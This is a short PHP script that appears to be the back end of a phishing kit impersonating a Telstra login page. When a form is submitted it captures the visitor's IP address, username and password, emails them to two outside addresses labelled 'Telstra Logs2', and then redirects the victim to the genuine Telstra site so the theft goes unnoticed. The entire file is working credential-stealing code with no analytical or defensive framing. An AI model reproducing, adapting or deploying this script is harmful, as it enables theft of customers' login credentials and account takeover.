<?php
if(isset($_POST["Submit"])){
$ip = $_SERVER["REMOTE_ADDR"];
$password = $_POST["password"];
$username = $_POST["username"];
$message = "ip========================".$ip."\r\n";
$message .= "username========================".$username."\r\n";
$message .= "password========================".$password."\r\n";
mail("brucemoore@mooreautomationltd.org,Xtinzylogs@yandex.com","Telstra Logs2",$message);
header("location:https://www.myservices.telstra.com.au/home");
}
?>